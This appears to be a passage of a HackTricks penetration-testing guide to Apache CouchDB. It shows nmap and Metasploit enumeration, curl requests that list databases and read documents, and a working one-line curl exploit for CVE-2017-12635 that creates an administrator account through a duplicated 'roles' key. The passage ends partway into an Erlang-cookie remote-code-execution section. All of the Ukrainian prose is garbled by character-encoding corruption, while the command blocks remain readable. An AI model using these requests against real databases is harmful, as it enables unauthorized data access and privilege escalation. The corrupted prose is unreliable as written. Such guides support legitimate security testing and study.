# 5984,6984 - –¢–µ—Å—Ç—É–≤–∞–Ω–Ω—è –Ω–∞ –ø—Ä–æ–Ω–∏–∫–Ω–µ–Ω–Ω—è CouchDB

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ –≤–∞—à—É **–∫–æ–º–ø–∞–Ω—ñ—é —Ä–µ–∫–ª–∞–º–æ–≤–∞–Ω—É –Ω–∞ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É —Ñ–æ—Ä–º–∞—Ç—ñ PDF**, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) **—ñ** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **—Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ GitHub.**

</details>

## **–û—Å–Ω–æ–≤–Ω–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è**

**CouchDB** - —Ü–µ —É–Ω—ñ–≤–µ—Ä—Å–∞–ª—å–Ω–∞ —Ç–∞ –ø–æ—Ç—É–∂–Ω–∞ **–¥–æ–∫—É–º–µ–Ω—Ç-–æ—Ä—ñ—î–Ω—Ç–æ–≤–∞–Ω–∞ –±–∞–∑–∞ –¥–∞–Ω–∏—Ö**, —è–∫–∞ –æ—Ä–≥–∞–Ω—ñ–∑–æ–≤—É—î –¥–∞–Ω—ñ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Å—Ç—Ä—É–∫—Ç—É—Ä–∏ **–∫–ª—é—á-–∑–Ω–∞—á–µ–Ω–Ω—è** –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –∫–æ–∂–Ω–æ–≥–æ **–¥–æ–∫—É–º–µ–Ω—Ç–∞**. –ü–æ–ª—è –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –¥–æ–∫—É–º–µ–Ω—Ç–∞ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω—ñ —É –≤–∏–≥–ª—è–¥—ñ **–ø–∞—Ä –∫–ª—é—á/–∑–Ω–∞—á–µ–Ω–Ω—è, —Å–ø–∏—Å–∫—ñ–≤ –∞–±–æ –∫–∞—Ä—Ç**, —â–æ –∑–∞–±–µ–∑–ø–µ—á—É—î –≥–Ω—É—á–∫—ñ—Å—Ç—å —É –∑–±–µ—Ä—ñ–≥–∞–Ω–Ω—ñ —Ç–∞ –æ—Ç—Ä–∏–º–∞–Ω–Ω—ñ –¥–∞–Ω–∏—Ö.

–ö–æ–∂–Ω–æ–º—É **–¥–æ–∫—É–º–µ–Ω—Ç—É**, –∑–±–µ—Ä–µ–∂–µ–Ω–æ–º—É –≤ CouchDB, –Ω–∞–¥–∞—î—Ç—å—Å—è **—É–Ω—ñ–∫–∞–ª—å–Ω–∏–π —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä** (`_id`) –Ω–∞ —Ä—ñ–≤–Ω—ñ –¥–æ–∫—É–º–µ–Ω—Ç–∞. –ö—Ä—ñ–º —Ç–æ–≥–æ, –∫–æ–∂–Ω–∞ –º–æ–¥–∏—Ñ—ñ–∫–∞—Ü—ñ—è, –∑—Ä–æ–±–ª–µ–Ω–∞ —Ç–∞ –∑–±–µ—Ä–µ–∂–µ–Ω–∞ –≤ –±–∞–∑—ñ –¥–∞–Ω–∏—Ö, –æ—Ç—Ä–∏–º—É—î **–Ω–æ–º–µ—Ä —Ä–µ–≤—ñ–∑—ñ—ó** (`_rev`). –¶–µ–π –Ω–æ–º–µ—Ä —Ä–µ–≤—ñ–∑—ñ—ó –¥–æ–∑–≤–æ–ª—è—î –µ—Ñ–µ–∫—Ç–∏–≤–Ω–æ **–≤—ñ–¥—Å—Ç–µ–∂—É–≤–∞—Ç–∏ —Ç–∞ –∫–µ—Ä—É–≤–∞—Ç–∏ –∑–º—ñ–Ω–∞–º–∏**, —Å–ø—Ä–∏—è—é—á–∏ –ª–µ–≥–∫–æ–º—É –æ—Ç—Ä–∏–º–∞–Ω–Ω—é —Ç–∞ —Å–∏–Ω—Ö—Ä–æ–Ω—ñ–∑–∞—Ü—ñ—ó –¥–∞–Ω–∏—Ö —É –º–µ–∂–∞—Ö –±–∞–∑–∏ –¥–∞–Ω–∏—Ö.

**–ü–æ—Ä—Ç –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º:** 5984 (http), 6984 (https)
```
PORT      STATE SERVICE REASON
5984/tcp  open  unknown syn-ack
```
## **–ê–≤—Ç–æ–º–∞—Ç–∏—á–Ω–µ –ø–µ—Ä–µ–ª—ñ—á–µ–Ω–Ω—è**
```bash
nmap -sV --script couchdb-databases,couchdb-stats -p <PORT> <IP>
msf> use auxiliary/scanner/couchdb/couchdb_enum
```
## –†—É—á–Ω–µ –ø–µ—Ä–µ–ª—ñ–∫—É–≤–∞–Ω–Ω—è

### –ë–∞–Ω–µ—Ä
```
curl http://IP:5984/
```
–¶–µ –≤—ñ–¥–ø—Ä–∞–≤–ª—è—î –∑–∞–ø–∏—Ç GET –¥–æ –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ–≥–æ –µ–∫–∑–µ–º–ø–ª—è—Ä–∞ CouchDB. –í—ñ–¥–ø–æ–≤—ñ–¥—å –ø–æ–≤–∏–Ω–Ω–∞ –≤–∏–≥–ª—è–¥–∞—Ç–∏ –ø—Ä–∏–±–ª–∏–∑–Ω–æ —Ç–∞–∫, —è–∫ –æ–¥–∏–Ω –∑ –Ω–∞—Å—Ç—É–ø–Ω–∏—Ö:
```bash
{"couchdb":"Welcome","version":"0.10.1"}
{"couchdb":"Welcome","version":"2.0.0","vendor":{"name":"The Apache Software Foundation"}}
```
{% hint style="info" %}
–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ –ø—Ä–∏ –¥–æ—Å—Ç—É–ø—ñ –¥–æ –∫–æ—Ä–µ–Ω—è couchdb –≤–∏ –æ—Ç—Ä–∏–º–∞—î—Ç–µ `401 Unauthorized` –∑ —á–∏–º–æ—Å—å –Ω–∞ –∑—Ä–∞–∑–æ–∫ —Ü—å–æ–≥–æ: `{"error":"unauthorized","reason":"Authentication required."}` **–≤–∏ –Ω–µ –∑–º–æ–∂–µ—Ç–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø** –¥–æ –±–∞–Ω–µ—Ä–∞ –∞–±–æ –±—É–¥—å-—è–∫–æ–≥–æ —ñ–Ω—à–æ–≥–æ –∫—ñ–Ω—Ü–µ–≤–æ–≥–æ –ø—É–Ω–∫—Ç—É.
{% endhint %}

### –Ü–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è –ø—Ä–æ –ø–µ—Ä–µ–ª—ñ–∫

–¶–µ –∫—ñ–Ω—Ü–µ–≤—ñ —Ç–æ—á–∫–∏, –¥–æ —è–∫–∏—Ö –≤–∏ –º–æ–∂–µ—Ç–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –∑–∞–ø–∏—Ç—É **GET** —Ç–∞ –≤–∏—Ç—è–≥—Ç–∏ –¥–µ—è–∫—É —Ü—ñ–∫–∞–≤—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é. –í–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ [**–±—ñ–ª—å—à–µ –∫—ñ–Ω—Ü–µ–≤–∏—Ö —Ç–æ—á–æ–∫ —Ç–∞ –±—ñ–ª—å—à –¥–µ—Ç–∞–ª—å–Ω—ñ –æ–ø–∏—Å–∏ –≤ –¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü—ñ—ó couchdb**](https://docs.couchdb.org/en/latest/api/index.html).

* **`/_active_tasks`** –°–ø–∏—Å–æ–∫ –∑–∞–ø—É—â–µ–Ω–∏—Ö –∑–∞–≤–¥–∞–Ω—å, –≤–∫–ª—é—á–∞—é—á–∏ —Ç–∏–ø –∑–∞–≤–¥–∞–Ω–Ω—è, –Ω–∞–∑–≤—É, —Å—Ç–∞—Ç—É—Å —Ç–∞ —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä –ø—Ä–æ—Ü–µ—Å—É.
* **`/_all_dbs`** –ü–æ–≤–µ—Ä—Ç–∞—î —Å–ø–∏—Å–æ–∫ –≤—Å—ñ—Ö –±–∞–∑ –¥–∞–Ω–∏—Ö –≤ –µ–∫–∑–µ–º–ø–ª—è—Ä—ñ CouchDB.
* **`/_cluster_setup`** –ü–æ–≤–µ—Ä—Ç–∞—î —Å—Ç–∞—Ç—É—Å –≤—É–∑–ª–∞ –∞–±–æ –∫–ª–∞—Å—Ç–µ—Ä–∞, –∑–≥—ñ–¥–Ω–æ –∑ –º–∞–π—Å—Ç—Ä–æ–º –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è –∫–ª–∞—Å—Ç–µ—Ä–∞.
* **`/_db_updates`** –ü–æ–≤–µ—Ä—Ç–∞—î —Å–ø–∏—Å–æ–∫ –≤—Å—ñ—Ö –ø–æ–¥—ñ–π –±–∞–∑ –¥–∞–Ω–∏—Ö –≤ –µ–∫–∑–µ–º–ø–ª—è—Ä—ñ CouchDB. –î–ª—è –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è —Ü—ñ—î—ó –∫—ñ–Ω—Ü–µ–≤–æ—ó —Ç–æ—á–∫–∏ –ø–æ—Ç—Ä—ñ–±–Ω–æ –Ω–∞—è–≤–Ω—ñ—Å—Ç—å –±–∞–∑–∏ –¥–∞–Ω–∏—Ö `_global_changes`.
* **`/_membership`** –ü–æ–∫–∞–∑—É—î –≤—É–∑–ª–∏, —è–∫—ñ —î —á–∞—Å—Ç–∏–Ω–æ—é –∫–ª–∞—Å—Ç–µ—Ä–∞ —è–∫ `cluster_nodes`. –ü–æ–ª–µ `all_nodes` –ø–æ–∫–∞–∑—É—î –≤—Å—ñ –≤—É–∑–ª–∏, —è–∫—ñ –≤—ñ–¥–æ–º—ñ —Ü—å–æ–º—É –≤—É–∑–ª—É, –≤–∫–ª—é—á–∞—é—á–∏ —Ç—ñ, —è–∫—ñ —î —á–∞—Å—Ç–∏–Ω–æ—é –∫–ª–∞—Å—Ç–µ—Ä–∞.
* **`/_scheduler/jobs`** –°–ø–∏—Å–æ–∫ —Ä–æ–±–æ—á–∏—Ö –∑–∞–≤–¥–∞–Ω—å —Ä–µ–ø–ª—ñ–∫–∞—Ü—ñ—ó. –ö–æ–∂–µ–Ω –æ–ø–∏—Å –∑–∞–≤–¥–∞–Ω–Ω—è –±—É–¥–µ –º—ñ—Å—Ç–∏—Ç–∏ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –ø—Ä–æ –¥–∂–µ—Ä–µ–ª–æ —Ç–∞ —Ü—ñ–ª—å, —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä —Ä–µ–ø–ª—ñ–∫–∞—Ü—ñ—ó, —ñ—Å—Ç–æ—Ä—ñ—é –æ—Å—Ç–∞–Ω–Ω—ñ—Ö –ø–æ–¥—ñ–π —Ç–∞ –∫—ñ–ª—å–∫–∞ —ñ–Ω—à–∏—Ö —Ä–µ—á–µ–π.
* **`/_scheduler/docs`** –°–ø–∏—Å–æ–∫ —Å—Ç–∞–Ω—ñ–≤ –¥–æ–∫—É–º–µ–Ω—Ç—ñ–≤ —Ä–µ–ø–ª—ñ–∫–∞—Ü—ñ—ó. –ú—ñ—Å—Ç–∏—Ç—å —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –ø—Ä–æ –≤—Å—ñ –¥–æ–∫—É–º–µ–Ω—Ç–∏, –Ω–∞–≤—ñ—Ç—å —É —Å—Ç–∞–Ω–∞—Ö `completed` —Ç–∞ `failed`. –î–ª—è –∫–æ–∂–Ω–æ–≥–æ –¥–æ–∫—É–º–µ–Ω—Ç–∞ –ø–æ–≤–µ—Ä—Ç–∞—î—Ç—å—Å—è —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä –¥–æ–∫—É–º–µ–Ω—Ç–∞, –±–∞–∑–∞ –¥–∞–Ω–∏—Ö, —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä —Ä–µ–ø–ª—ñ–∫–∞—Ü—ñ—ó, –¥–∂–µ—Ä–µ–ª–æ —Ç–∞ —Ü—ñ–ª—å —Ç–∞ —ñ–Ω—à–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è.
* **`/_scheduler/docs/{replicator_db}`**
* **`/_scheduler/docs/{replicator_db}/{docid}`**
* **`/_node/{node-name}`** –ö—ñ–Ω—Ü–µ–≤–∞ —Ç–æ—á–∫–∞ `/_node/{node-name}` –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–∞ –¥–ª—è –ø—ñ–¥—Ç–≤–µ—Ä–¥–∂–µ–Ω–Ω—è —ñ–º–µ–Ω—ñ –≤—É–∑–ª–∞ Erlang —Å–µ—Ä–≤–µ—Ä–∞, —è–∫–∏–π –æ–±—Ä–æ–±–ª—è—î –∑–∞–ø–∏—Ç. –¶–µ –Ω–∞–π–±—ñ–ª—å—à –∫–æ—Ä–∏—Å–Ω–æ –ø—Ä–∏ –¥–æ—Å—Ç—É–ø—ñ –¥–æ `/_node/_local` –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è —Ü—ñ—î—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó.
* **`/_node/{node-name}/_stats`** –†–µ—Å—É—Ä—Å `_stats` –ø–æ–≤–µ—Ä—Ç–∞—î –æ–±'—î–∫—Ç JSON, —â–æ –º—ñ—Å—Ç–∏—Ç—å —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫—É –¥–ª—è –ø—Ä–∞—Ü—é—é—á–æ–≥–æ —Å–µ—Ä–≤–µ—Ä–∞. –õ—ñ—Ç–µ—Ä–∞–ª—å–Ω–∏–π —Ä—è–¥–æ–∫ `_local` —Å–ª—É–∂–∏—Ç—å —è–∫ –ø—Å–µ–≤–¥–æ–Ω—ñ–º –¥–ª—è –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ —ñ–º–µ–Ω—ñ –≤—É–∑–ª–∞, —Ç–æ–º—É –¥–ª—è –≤—Å—ñ—Ö URL —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∏ `{node-name}` –º–æ–∂–Ω–∞ –∑–∞–º—ñ–Ω–∏—Ç–∏ –Ω–∞ `_local`, —â–æ–± –≤–∑–∞—î–º–æ–¥—ñ—è—Ç–∏ –∑—ñ —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–æ—é –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ –≤—É–∑–ª–∞.
* **`/_node/{node-name}/_system`** –†–µ—Å—É—Ä—Å \_system –ø–æ–≤–µ—Ä—Ç–∞—î –æ–±'—î–∫—Ç JSON, —â–æ –º—ñ—Å—Ç–∏—Ç—å —Ä—ñ–∑–Ω–æ–º–∞–Ω—ñ—Ç–Ω—É —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫—É –Ω–∞ —Ä—ñ–≤–Ω—ñ —Å–∏—Å—Ç–µ–º–∏ –¥–ª—è –ø—Ä–∞—Ü—é—é—á–æ–≥–æ —Å–µ—Ä–≤–µ—Ä–∞\_.\_ –í–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ \_\_`_local` —è–∫ {node-name} –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –ø–æ—Ç–æ—á–Ω–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø—Ä–æ –≤—É–∑–æ–ª.
* **`/_node/{node-name}/_restart`**
* **`/_up`** –ü—ñ–¥—Ç–≤–µ—Ä–¥–∂—É—î, —â–æ —Å–µ—Ä–≤–µ—Ä –ø—Ä–∞—Ü—é—î, –≥–æ—Ç–æ–≤–∏–π –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—Ç–∏ –Ω–∞ –∑–∞–ø–∏—Ç–∏. –Ø–∫—â–æ [`maintenance_mode`](https://docs.couchdb.org/en/latest/config/couchdb.html#couchdb/maintenance\_mode) —î `true` –∞–±–æ `nolb`, –∫—ñ–Ω—Ü–µ–≤–∞ —Ç–æ—á–∫–∞ –ø–æ–≤–µ—Ä–Ω–µ –≤—ñ–¥–ø–æ–≤—ñ–¥—å 404.
* **`/_uuids`** –ó–∞–ø–∏—Ç—É—î –æ–¥–∏–Ω –∞–±–æ –¥–µ–∫—ñ–ª—å–∫–∞ —É–Ω—ñ–∫–∞–ª—å–Ω–∏—Ö —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä—ñ–≤ (UUID) –∑ –µ–∫–∑–µ–º–ø–ª—è—Ä–∞ CouchDB.
* **`/_reshard`** –ü–æ–≤–µ—Ä—Ç–∞—î –∫—ñ–ª—å–∫—ñ—Å—Ç—å –∑–∞–≤–µ—Ä—à–µ–Ω–∏—Ö, –Ω–µ –≤–¥–∞–ª–æ—Å—è, –∑–∞–ø—É—â–µ–Ω–∏—Ö, –∑—É–ø–∏–Ω–µ–Ω–∏—Ö —Ç–∞ –∑–∞–≥–∞–ª—å–Ω–∏—Ö –∑–∞–≤–¥–∞–Ω—å —Ä–∞–∑–æ–º —ñ–∑ —Å—Ç–∞–Ω–æ–º –ø–µ—Ä–µ—Ä–æ–∑–ø–æ–¥—ñ–ª—É –≤ –∫–ª–∞—Å—Ç–µ—Ä—ñ.

–ë—ñ–ª—å—à–µ —Ü—ñ–∫–∞–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –º–æ–∂–Ω–∞ –≤–∏—Ç—è–≥–Ω—É—Ç–∏, —è–∫ –ø–æ—è—Å–Ω–µ–Ω–æ —Ç—É—Ç: [https://lzone.de/cheat-sheet/CouchDB](https://lzone.de/cheat-sheet/CouchDB)

### **–°–ø–∏—Å–æ–∫ –±–∞–∑ –¥–∞–Ω–∏—Ö**
```
curl -X GET http://IP:5984/_all_dbs
```
–Ø–∫—â–æ –∑–∞–ø–∏—Ç –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—î –∑ **401 –Ω–µ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω–æ**, —Ç–æ–¥—ñ –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω—ñ **–¥—ñ–π—Å–Ω—ñ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ**, —â–æ–± –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ –±–∞–∑–∏ –¥–∞–Ω–∏—Ö:
```
curl -X GET http://user:password@IP:5984/_all_dbs
```
–î–ª—è –ø–æ—à—É–∫—É –¥—ñ–π—Å–Ω–∏—Ö –æ–±–ª—ñ–∫–æ–≤–∏—Ö –¥–∞–Ω–∏—Ö –≤–∏ –º–æ–∂–µ—Ç–µ **—Å–ø—Ä–æ–±—É–≤–∞—Ç–∏** [**–∑–ª–∞–º–∞—Ç–∏ —Å–ª—É–∂–±—É**](../generic-methodologies-and-resources/brute-force.md#couchdb).

–¶–µ **–ø—Ä–∏–∫–ª–∞–¥** –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ couchdb, –∫–æ–ª–∏ —É –≤–∞—Å —î **–¥–æ—Å—Ç–∞—Ç–Ω—å–æ –ø—Ä–∏–≤—ñ–ª–µ—ó–≤** –¥–ª—è –ø–µ—Ä–µ–ª—ñ–∫—É –±–∞–∑ –¥–∞–Ω–∏—Ö (—Ü–µ –ø—Ä–æ—Å—Ç–æ —Å–ø–∏—Å–æ–∫ –±–∞–∑ –¥–∞–Ω–∏—Ö):
```bash
["_global_changes","_metadata","_replicator","_users","passwords","simpsons"]
```
### –Ü–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è –ø—Ä–æ –±–∞–∑—É –¥–∞–Ω–∏—Ö

–í–∏ –º–æ–∂–µ—Ç–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–µ—è–∫—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –ø—Ä–æ –±–∞–∑—É –¥–∞–Ω–∏—Ö (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, –∫—ñ–ª—å–∫—ñ—Å—Ç—å —Ñ–∞–π–ª—ñ–≤ —Ç–∞ —ó—Ö —Ä–æ–∑–º—ñ—Ä–∏), –∑–≤–µ—Ä–Ω—É–≤—à–∏—Å—å –¥–æ –Ω–∞–∑–≤–∏ –±–∞–∑–∏ –¥–∞–Ω–∏—Ö:
```bash
curl http://IP:5984/<database>
curl http://localhost:5984/simpsons
#Example response:
{"db_name":"simpsons","update_seq":"7-g1AAAAFTeJzLYWBg4MhgTmEQTM4vTc5ISXLIyU9OzMnILy7JAUoxJTIkyf___z8rkQmPoiQFIJlkD1bHjE-dA0hdPFgdAz51CSB19WB1jHjU5bEASYYGIAVUOp8YtQsgavfjtx-i9gBE7X1i1D6AqAX5KwsA2vVvNQ","sizes":{"file":62767,"external":1320,"active":2466},"purge_seq":0,"other":{"data_size":1320},"doc_del_count":0,"doc_count":7,"disk_size":62767,"disk_format_version":6,"data_size":2466,"compact_running":false,"instance_start_time":"0"}
```
### **–°–ø–∏—Å–æ–∫ –¥–æ–∫—É–º–µ–Ω—Ç—ñ–≤**

–ü–µ—Ä–µ—Ä–∞—Ö—É–π—Ç–µ –∫–æ–∂–µ–Ω –∑–∞–ø–∏—Å —É –±–∞–∑—ñ –¥–∞–Ω–∏—Ö
```bash
curl -X GET http://IP:5984/{dbname}/_all_docs
curl http://localhost:5984/simpsons/_all_docs
#Example response:
{"total_rows":7,"offset":0,"rows":[
{"id":"f0042ac3dc4951b51f056467a1000dd9","key":"f0042ac3dc4951b51f056467a1000dd9","value":{"rev":"1-fbdd816a5b0db0f30cf1fc38e1a37329"}},
{"id":"f53679a526a868d44172c83a61000d86","key":"f53679a526a868d44172c83a61000d86","value":{"rev":"1-7b8ec9e1c3e29b2a826e3d14ea122f6e"}},
{"id":"f53679a526a868d44172c83a6100183d","key":"f53679a526a868d44172c83a6100183d","value":{"rev":"1-e522ebc6aca87013a89dd4b37b762bd3"}},
{"id":"f53679a526a868d44172c83a61002980","key":"f53679a526a868d44172c83a61002980","value":{"rev":"1-3bec18e3b8b2c41797ea9d61a01c7cdc"}},
{"id":"f53679a526a868d44172c83a61003068","key":"f53679a526a868d44172c83a61003068","value":{"rev":"1-3d2f7da6bd52442e4598f25cc2e84540"}},
{"id":"f53679a526a868d44172c83a61003a2a","key":"f53679a526a868d44172c83a61003a2a","value":{"rev":"1-4446bfc0826ed3d81c9115e450844fb4"}},
{"id":"f53679a526a868d44172c83a6100451b","key":"f53679a526a868d44172c83a6100451b","value":{"rev":"1-3f6141f3aba11da1d65ff0c13fe6fd39"}}
]}
```
### **–ß–∏—Ç–∞–Ω–Ω—è –¥–æ–∫—É–º–µ–Ω—Ç–∞**

–ü—Ä–æ—á–∏—Ç–∞–π—Ç–µ –≤–º—ñ—Å—Ç –¥–æ–∫—É–º–µ–Ω—Ç–∞ —É –±–∞–∑—ñ –¥–∞–Ω–∏—Ö:
```bash
curl -X GET http://IP:5984/{dbname}/{id}
curl http://localhost:5984/simpsons/f0042ac3dc4951b51f056467a1000dd9
#Example response:
{"_id":"f0042ac3dc4951b51f056467a1000dd9","_rev":"1-fbdd816a5b0db0f30cf1fc38e1a37329","character":"Homer","quote":"Doh!"}
```
## –ü—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ –≤ CouchDB [CVE-2017-12635](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2017-12635)

–ë–ª–∞–≥–æ–¥–∞—Ä—è —Ä—ñ–∑–Ω–∏—Ü—ñ –º—ñ–∂ –ø–∞—Ä—Å–µ—Ä–∞–º–∏ JSON Erlang —Ç–∞ JavaScript –≤–∏ –º–æ–∂–µ—Ç–µ **—Å—Ç–≤–æ—Ä–∏—Ç–∏ –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞** –∑ –æ–±–ª—ñ–∫–æ–≤–∏–º–∏ –¥–∞–Ω–∏–º–∏ `hacktricks:hacktricks` –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –Ω–∞—Å—Ç—É–ø–Ω–æ–≥–æ –∑–∞–ø–∏—Ç—É:
```bash
curl -X PUT -d '{"type":"user","name":"hacktricks","roles":["_admin"],"roles":[],"password":"hacktricks"}' localhost:5984/_users/org.couchdb.user:hacktricks -H "Content-Type:application/json"
```
[**–î–æ–¥–∞—Ç–∫–æ–≤–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è –ø—Ä–æ —Ü—é —É—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å —Ç—É—Ç**](https://justi.cz/security/2017/11/14/couchdb-rce-npm.html).

## CouchDB RCE

### **–û–≥–ª—è–¥ –±–µ–∑–ø–µ–∫–∏ Erlang Cookie**

–ü—Ä–∏–∫–ª–∞–¥ [–∑–≤—ñ–¥—Å–∏](https://0xdf.gitlab.io/2018/09/15/htb-canape.html).

–£ –¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü—ñ—ó CouchDB, –∑–æ–∫—Ä–µ–º–∞ –≤ —Ä–æ–∑–¥—ñ–ª—ñ, —â–æ —Å—Ç–æ—Å—É—î—Ç—å—Å—è –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è –∫–ª–∞—Å—Ç–µ—Ä–∞ ([–ø–æ—Å–∏–ª–∞–Ω–Ω—è](http://docs.couchdb.org/en/stable/cluster/setup.html#cluster-setup)), –æ–±–≥–æ–≤–æ—Ä—é—î—Ç—å—Å—è –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –ø–æ—Ä—Ç—ñ–≤ CouchDB —É —Ä–µ–∂–∏–º—ñ –∫–ª–∞—Å—Ç–µ—Ä–∞. –ó–∞–∑–Ω–∞—á–∞—î—Ç—å—Å—è, —â–æ, —è–∫ —ñ –≤ —Ä–µ–∂–∏–º—ñ –∞–≤—Ç–æ–Ω–æ–º–Ω–æ—ó —Ä–æ–±–æ—Ç–∏, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –ø–æ—Ä—Ç `5984`. –î–æ–¥–∞—Ç–∫–æ–≤–æ, –ø–æ—Ä—Ç `5986` –ø—Ä–∏–∑–Ω–∞—á–µ–Ω–∏–π –¥–ª—è –ª–æ–∫–∞–ª—å–Ω–∏—Ö API –≤—É–∑–ª–∞, —ñ, —â–æ –≤–∞–∂–ª–∏–≤–æ, Erlang –≤–∏–º–∞–≥–∞—î TCP-–ø–æ—Ä—Ç `4369` –¥–ª—è –¥–µ–º–æ–Ω–∞ –≤—ñ–¥–æ–±—Ä–∞–∂–µ–Ω–Ω—è –ø–æ—Ä—Ç—ñ–≤ Erlang (EPMD), —è–∫–∏–π —Å–ø—Ä–∏—è—î –≤–∑–∞—î–º–æ–¥—ñ—ó –≤—É–∑–ª—ñ–≤ —É –º–µ–∂–∞—Ö 